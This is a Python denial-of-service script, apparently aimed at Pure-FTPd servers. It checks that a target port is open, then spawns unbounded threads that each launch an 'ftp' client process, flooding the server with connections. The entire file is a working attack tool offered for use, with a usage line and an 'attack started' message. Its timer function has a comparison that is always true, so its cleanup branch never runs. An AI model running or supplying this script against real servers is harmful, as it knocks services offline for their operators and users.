import socket
import sys
import threading
import subprocess
import time

BANNER = """
._________________.
|    Pure-FTPd    |
|      D o S      |
|_________________|
|By XYN/DUMP/NSKB3|
|_|_____________|_|
|_|_|_|_____|_|_|_|
|_|_|_|_|_|_|_|_|_|

"""
USAGE = "{} <TARGET> <PORT(DEFAULT:21)> <MAX_CONNS(DEFAULT:50)> [-v/--verbose] [-h/--help]".format(sys.argv[0])

def test(target, port):
    s = socket.socket()
    s.settimeout(10)
    try:
        s.connect((target, port))
        response = s.recv(65535)
        s.close()
        return 0
    except socket.error:
        print("Port {} is not open, please specify a port that is open.".format(port))
        sys.exit()

def attack(target, port, id, verbose):
    try:
        subprocess.Popen(["ftp", target, str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if verbose:
            print(f"Worker {id} running")
    except OSError:
        pass

def loop(target, port, conns, verbose):
    while True:
        for i in range(1, conns + 3):
            t = threading.Thread(target=attack, args=(target, port, i, verbose,))
            t.start()

def timer(target, port, conns, verbose):
    start = time.time()
    while True:
        if start < time.time() + 900:
            pass
        else:
            subprocess.Popen(["pkill", "ftp"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            loop(target, port, conns, verbose)
            break

def main():
    if len(sys.argv) < 2 or "-h" in sys.argv or "--help" in sys.argv:
        print(USAGE)
        sys.exit()

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 21
    conns = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3].isdigit() else 50
    verbose = "-v" in sys.argv or "--verbose" in sys.argv

    print(BANNER)
    print("[!] Testing if {}:{} is open".format(target, port))
    test(target, port)
    print("[+] Port {} open, starting attack...".format(port))
    time.sleep(2)
    print("[+] Attack started on {}:{}!".format(target, port))

    threading.Thread(target=loop, args=(target, port, conns, verbose)).start()
    threading.Thread(target=timer, args=(target, port, conns, verbose)).start()

if __name__ == "__main__":
    main()

